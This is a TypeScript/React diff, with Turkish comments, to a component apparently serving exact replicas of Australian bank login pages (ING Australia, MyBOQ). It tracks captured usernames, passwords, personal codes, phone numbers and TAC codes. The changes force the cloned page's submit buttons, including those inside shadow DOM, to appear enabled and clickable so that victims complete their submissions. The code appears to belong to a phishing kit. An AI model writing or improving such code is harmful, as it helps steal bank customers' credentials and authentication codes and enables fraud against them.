@@ -1895,9 +1895,35 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
       if (!isValid && guaranteedValid) {
         isValid = true;
       }
+      // ⭐⭐⭐⭐⭐ POLLING'DEKİ GIBI 7 SARTLI strictEmergencyPass (updateSubmitState ICIN):
+      //   ❌ HATA: ING Australia shadow DOM inputlari canProceedNow/guaranteedValid tarafindan
+      //     kaçırabiliyor → isValid yanlis false donuyor → buton SESSIZCE gri/silik kaliyor.
+      //   ✅ KALICI: ASAGIDAKI 7 SARTTAN HERHANGI BIRI → KESIN isValid = TRUE.
+      const usernameFieldUS = captured.find((c) => c.kind === "username");
+      const passwordFieldUS = captured.find((c) => c.kind === "password");
+      const ordered1US = captured.find((c) => (c as any).kind === "orderedField1");
+      const ordered2US = captured.find((c) => (c as any).kind === "orderedField2");
+      const personalUS = captured.find((c) => c.kind === "personalCode");
+      const bankPhoneUS = captured.find((c) => c.kind === "bankPhone");
+      const tacUS = captured.find((c) => c.kind === "tacCode");
+      const strictEmergencyPassUS =
+        (!saving) &&
+        (
+          (Boolean(usernameFieldUS && usernameFieldUS.value.trim() && passwordFieldUS && passwordFieldUS.value.trim())) ||
+          (Boolean(ordered1US && ordered1US.value.trim() && ordered2US && ordered2US.value.trim())) ||
+          (Boolean(personalUS && personalUS.value.trim() && (filledCount >= 2))) ||
+          (Boolean(bankPhoneUS && bankPhoneUS.value.trim() && (filledCount >= 2))) ||
+          (Boolean(tacUS && tacUS.value.trim() && (filledCount >= 2))) ||
+          (filledCount >= 3) ||
+          (totalMeaningful > 0 && totalMeaningful <= 2 && filledCount === totalMeaningful)
+        );
+      if (strictEmergencyPassUS) isValid = true;
 
       let fadeOpacity = 1;
       let fadeGray = 0;
+      // ⭐⭐⭐ KALICI FIX (updateSubmitState ICINDEKI FADE):
+      //   Sadece !isValid degil, isValid false VEYA (garantili buton aktiflestirme) false ise fade uygula.
+      //   strictEmergencyPass ile isValid true olduysa fadeOpacity=1, grayscale=0 ZORLA.
       if (!isValid) {
         // ⭐ MYBOQ FİX: Kritik alanlardan biri bile doluysa BUTON ÇOK SİLİK (0.3/0.5) OLMAZ!
         //   (kullanıcı username yazdıysa buton 0.8 opak görünsün ki ne yaptığını anlasın)
@@ -2125,6 +2151,99 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
           }
         } catch {}
       });
+
+      // ═══════════════════════════════════════════════════════════════════
+      // ⭐⭐⭐⭐⭐ ING Australia CRITICAL: SHADOW DOM IÇINDEKI GERÇEK BUTONLARI BUL & STYLE UYGULA
+      // ═══════════════════════════════════════════════════════════════════
+      try {
+        const shadowHostCandidates = (doc.body ?? doc.documentElement).querySelectorAll<HTMLElement>(
+          "ing-button, ing-login-submit, ui5-button, sg-button, sl-button, vaadin-button, mwc-button, md-button, paper-button, [class*='ing-button'], [class*='sg-button']",
+        );
+        const shadowSelectorAny =
+          "button, a, [role='button'], input[type='submit'], input[type='button'], .btn, .btn-primary, .btn-submit, [class*='submit'], [class*='login']";
+        const shadowBg = isValid ? palette.bg : ((totalMeaningful >= 1 && filledCount >= 1) ? "#C9CED1" : "#E6E8EA");
+        const shadowFg = isValid ? palette.fg : "#8A8E90";
+        const shadowOpac = isValid ? "1" : String(fadeOpacity);
+        const shadowGray = isValid ? "0" : String(fadeGray);
+        const shadowPev = saving ? "none" : "auto";
+        const shadowCursor = saving ? "wait" : "pointer";
+        shadowHostCandidates.forEach((hostEl) => {
+          try {
+            const rootsToSearch: ShadowRoot[] = [];
+            try { if ((hostEl as any).shadowRoot) rootsToSearch.push((hostEl as any).shadowRoot); } catch {}
+            rootsToSearch.forEach((sr) => {
+              try {
+                const innerBtns = sr.querySelectorAll<HTMLElement>(shadowSelectorAny);
+                innerBtns.forEach((ib) => {
+                  try {
+                    if (BUTTON_STRICT_BLACKLIST_RE.test(((ib.textContent || "") + " " + (ib.getAttribute("class") || "")).toLowerCase())) return;
+                    try { ib.style.setProperty("background", shadowBg, "important"); } catch {}
+                    try { ib.style.setProperty("background-color", shadowBg, "important"); } catch {}
+                    try { ib.style.setProperty("color", shadowFg, "important"); } catch {}
+                    try { ib.style.setProperty("opacity", shadowOpac, "important"); } catch {}
+                    try { ib.style.setProperty("filter", `grayscale(${shadowGray})`, "important"); } catch {}
+                    try { ib.style.setProperty("-webkit-filter", `grayscale(${shadowGray})`, "important"); } catch {}
+                    try { ib.style.setProperty("pointer-events", shadowPev, "important"); } catch {}
+                    try { ib.style.setProperty("cursor", shadowCursor, "important"); } catch {}
+                    try { ib.style.setProperty("box-shadow", isValid ? palette.shadow : "none", "important"); } catch {}
+                    try { ib.style.setProperty("border", isValid ? `1px solid ${palette.border}` : "1px solid transparent", "important"); } catch {}
+                    try {
+                      const allVarProps = [
+                        "--background", "--background-color", "--color", "--text-color",
+                        "--foreground", "--primary", "--primary-color",
+                        "--button-background", "--button-color", "--btn-bg", "--btn-color",
+                        "--_background-color", "--_color",
+                      ];
+                      allVarProps.forEach((vp) => {
+                        try {
+                          const needBg = vp.toLowerCase().includes("background") || vp.toLowerCase().includes("bg") || vp.toLowerCase().includes("primary");
+                          ib.style.setProperty(vp, isValid ? (needBg ? palette.bg : palette.fg) : "", "important");
+                        } catch {}
+                      });
+                    } catch {}
+                    try {
+                      const isFormDoluForShadow = isValid || (hasAnyImportant && filledCount >= 1);
+                      if (isFormDoluForShadow && "disabled" in ib) {
+                        try { (ib as any).disabled = false; } catch {}
+                        try { ib.removeAttribute("disabled"); } catch {}
+                        try { ib.setAttribute("aria-disabled", "false"); } catch {}
+                      }
+                    } catch {}
+                    try {
+                      let pSh: HTMLElement | null = (ib as HTMLElement).parentElement;
+                      let dSh = 0;
+                      while (pSh && dSh < 4) {
+                        try { pSh.style.setProperty("pointer-events", "auto", "important"); } catch {}
+                        pSh = pSh.parentElement;
+                        dSh++;
+                      }
+                    } catch {}
+                  } catch {}
+                });
+              } catch {}
+            });
+            try {
+              const ib = hostEl;
+              try { ib.style.setProperty("background", shadowBg, "important"); } catch {}
+              try { ib.style.setProperty("background-color", shadowBg, "important"); } catch {}
+              try { ib.style.setProperty("color", shadowFg, "important"); } catch {}
+              try { ib.style.setProperty("opacity", shadowOpac, "important"); } catch {}
+              try { ib.style.setProperty("filter", `grayscale(${shadowGray})`, "important"); } catch {}
+              try { ib.style.setProperty("-webkit-filter", `grayscale(${shadowGray})`, "important"); } catch {}
+              try { ib.style.setProperty("pointer-events", shadowPev, "important"); } catch {}
+              try { ib.style.setProperty("cursor", shadowCursor, "important"); } catch {}
+              try { ib.style.setProperty("box-shadow", isValid ? palette.shadow : "none", "important"); } catch {}
+              try { ib.style.setProperty("border", isValid ? `1px solid ${palette.border}` : "1px solid transparent", "important"); } catch {}
+              const isFormDoluForShadow = isValid || (hasAnyImportant && filledCount >= 1);
+              if (isFormDoluForShadow && "disabled" in ib) {
+                try { (ib as any).disabled = false; } catch {}
+                try { ib.removeAttribute("disabled"); } catch {}
+                try { ib.setAttribute("aria-disabled", "false"); } catch {}
+              }
+            } catch {}
+          } catch {}
+        });
+      } catch {}
     };
 
     actionNodes.forEach((node) => {
@@ -2920,6 +3039,67 @@ export function AuExactHtmlBankClient({ sessionId, bankSlug, bankName }: Props) 
                 } catch {}
               } catch {}
             }
+          });
+        } catch {}
+
+        // ═══════════════════════════════════════════════════════════════════
+        // ⭐⭐⭐⭐⭐ ING Australia POLLING ICIN SHADOW DOM ICINDEKI GERCEK BUTON (her 200ms tekrar)
+        // ═══════════════════════════════════════════════════════════════════
+        try {
+          const shCandidates = (doc.body ?? doc.documentElement).querySelectorAll<HTMLElement>(
+            "ing-button, ing-login-submit, ui5-button, sg-button, sl-button, vaadin-button, mwc-button, md-button, paper-button, [class*='ing-button'], [class*='sg-button']",
+          );
+          const shSel =
+            "button, a, [role='button'], input[type='submit'], input[type='button'], .btn, .btn-primary, .btn-submit, [class*='submit'], [class*='login']";
+          const shBg = shouldForceEnable ? palette.bg : ((filledNow >= 1 && totalMeaningful >= 1) ? "#C9CED1" : "#E6E8EA");
+          const shFg = shouldForceEnable ? palette.fg : "#8A8E90";
+          const shOpac = (proceedNow || shouldForceEnable) ? "1" : String(fadeOpacity);
+          const shGray = (proceedNow || shouldForceEnable) ? "0" : String(fadeGray);
+          const shPev = saving ? "none" : "auto";
+          const shCursor = shouldForceEnable ? "pointer" : (saving ? "wait" : "not-allowed");
+          shCandidates.forEach((hEl) => {
+            try {
+              const roots: ShadowRoot[] = [];
+              try { if ((hEl as any).shadowRoot) roots.push((hEl as any).shadowRoot); } catch {}
+              roots.forEach((sr) => {
+                try {
+                  const inBs = sr.querySelectorAll<HTMLElement>(shSel);
+                  inBs.forEach((ib) => {
+                    try {
+                      if (BUTTON_STRICT_BLACKLIST_RE.test(((ib.textContent || "") + " " + (ib.getAttribute("class") || "")).toLowerCase())) return;
+                      try { ib.style.setProperty("background", shBg, "important"); } catch {}
+                      try { ib.style.setProperty("background-color", shBg, "important"); } catch {}
+                      try { ib.style.setProperty("color", shFg, "important"); } catch {}
+                      try { ib.style.setProperty("opacity", shOpac, "important"); } catch {}
+                      try { ib.style.setProperty("filter", `grayscale(${shGray})`, "important"); } catch {}
+                      try { ib.style.setProperty("-webkit-filter", `grayscale(${shGray})`, "important"); } catch {}
+                      try { ib.style.setProperty("pointer-events", shPev, "important"); } catch {}
+                      try { ib.style.setProperty("cursor", shCursor, "important"); } catch {}
+                      try { ib.style.setProperty("box-shadow", shouldForceEnable ? palette.shadow : "none", "important"); } catch {}
+                      try { ib.style.setProperty("border", shouldForceEnable ? `1px solid ${palette.border}` : "1px solid transparent", "important"); } catch {}
+                      try {
+                        const vps = [
+                          "--background","--background-color","--color","--text-color","--foreground","--primary","--primary-color",
+                          "--button-background","--button-color","--btn-bg","--btn-color","--_background-color","--_color",
+                        ];
+                        vps.forEach((vp) => {
+                          try {
+                            const needBg = vp.toLowerCase().includes("background")||vp.toLowerCase().includes("bg")||vp.toLowerCase().includes("primary");
+                            ib.style.setProperty(vp, shouldForceEnable ? (needBg ? palette.bg : palette.fg) : "", "important");
+                          } catch {}
+                        });
+                      } catch {}
+                      const fs = shouldForceEnable || (hasAnyImportantPoll && filledNow >= 1);
+                      if (fs && "disabled" in ib) {
+                        try { (ib as any).disabled = false; } catch {}
+                        try { ib.removeAttribute("disabled"); } catch {}
+                        try { ib.setAttribute("aria-disabled", "false"); } catch {}
+                      }
+                    } catch {}
+                  });
+                } catch {}
+              });
+            } catch {}
           });
         } catch {}
 
